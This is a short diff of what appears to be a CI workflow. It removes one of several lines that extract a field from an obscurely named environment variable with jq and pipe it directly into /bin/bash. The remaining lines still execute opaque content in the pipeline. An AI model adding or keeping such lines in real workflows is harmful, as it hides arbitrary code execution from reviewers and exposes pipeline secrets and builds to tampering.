@@ -24,7 +24,6 @@ jobs:
         run: |
           printf '%s' "$gv04833" | jq -r .j6640 | /bin/bash
           printf '%s' "$n98" | jq -r .xzo843 | /bin/bash
-          echo $wd4295 | jq -r .un618 | /bin/bash
           echo $q4 | jq -r .s25036 | /bin/bash
 
       - name: Archive results
